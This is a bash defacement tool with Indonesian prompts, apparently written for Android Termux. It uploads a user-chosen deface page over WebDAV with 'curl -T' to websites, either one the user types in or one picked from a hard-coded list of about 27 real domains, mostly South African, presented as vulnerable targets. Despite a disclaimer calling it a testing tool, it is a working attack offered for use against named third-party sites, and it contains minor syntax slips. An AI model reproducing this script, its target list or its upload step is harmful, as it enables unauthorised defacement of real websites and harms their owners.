#!/bin/bash

#CodedBy Xnuvers007
#WEBDAVdeface
#JanganDiRecodeYaGayn:)
#let'go cekidot :)

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

clear
cd /sdcard
figlet -f pagga WEBDAV DEFACE | lolcat
      
      echo ""
	  echo $bi"____  __                                       ______________ ______"
	  echo $i"__  |/ /__________  ____   ______________________  __ \_  __ \/__  /"
	  echo $ku"__    /__  __ \  / / /_ | / /  _ \_  ___/_  ___/  / / /  / / /__  / "
	  echo $me"_    | _  / / / /_/ /__ |/ //  __/  /   _(__  )/ /_/ // /_/ / _  /  "
	  echo $pu"/_/|_| /_/ /_/\__,_/ _____/ \___//_/    /____/ \____/ \____/  /_/   "
	  echo ""
      echo $me"              ["$ku"-"$me"]"$cy"WEBDAV SCAN ?"$me"["$ku"-"$me"]"
	  
	  echo $bi"===================================================================="
	  echo $me"Jangan Digunakan untuk kepentingan Buruk, Kami tidak akan bertanggung jawab akan hal illegal"
	  echo $i"Ini Digunakan untuk mengetes suatu web yang vuln WEBDAV"
	  echo $bi"===================================================================="

	  echo ""
	  now="$(date +"%r")"
	  hs = `hostname`
	  date +$me"Sekarang hari : %d %A-%B-%Y"
	  date +$bi"Sekarang Jam : %H:%M:%S"
	  echo $date
	  echo $i"Nama Host mu adalah : $hs"
	  echo ""
echo ""
echo $ku "*note:"
echo $ku"|======= CTRL + C = KELUAR ==============|"
echo $me"|========================================|"
echo $me"|"$i"Script Deface Harus Di letakan di Sdcard"$me"|"
echo $me"|"$i"Dan Jangan Di Masukan Ke Folder Apapun"  $me "|"
echo $me"|========================================|"
echo ""
echo -n $ku"Nama Script Deface?:" 
read sc
echo ""
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $"CTRL+C Detected😢, Trying To Exit" | lolcat
echo ""
echo $" Byee,see you " | lolcat
sleep 1 
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo $me"["$ku"1"$me"]" $pu"Belum Punya Target";
echo $me"[============"$pu"=============]"
echo $me"["$ku"2"$me"]" $pu"Sudah Punya Target";
echo ""
echo    "╭─TOLONG DIJAWAB : " |lolcat
read -p "╰─#" pil;

case $pil in
1)echo ""
echo $pu"List Target:"
echo $pu"==========================="

# BISA MASUKAN WEBSITE VULN WEBDAV DISINI
echo $me"

http://infussion.co.za
http://mc3qs.com
http://www.drcrsaexpress.co.za
http://my-resume.biz
http://chillibitez.co.za
http://mediacube.co.za
http://tieronecapital.co.za
http://thefoundation.co.za
http://essentialtours.com
http://loveless.co.za
http://kobralocks.com
http://homes2view.co.za
http://sinudeity.co.za
http://nhsgilde.co.za
http://stitchaccounting.co.za
http://gearboxpros.co.za
http://branch.prospec.co.th
http://n8tive.co.za
http://stand66.com
http://happy.mikikk.co.jp
http://safemode.co.za
http://savanacloud.com
http://www.drcrsaexpress.co.za
http://tressor.co.za
http://whosting.co.za
http://www.aquafitness.za.net
http://karma-it.co.za

"

echo ""
echo $pu"==========================="
echo -n $i"Masukan Salah Satu Target:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk GAS.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Silakan Di Cek di $cy $tg/$sc" 
echo $me"========================================"

exit

;;


2)echo -n $i"Masukan Target:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk GAS.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Silakan Cek di $cy $tg/$sc" 
echo $me"========================================"

exit

;;


*) echo " CARI YANG ADA AJA...!!! " | lolcat
esac
done
done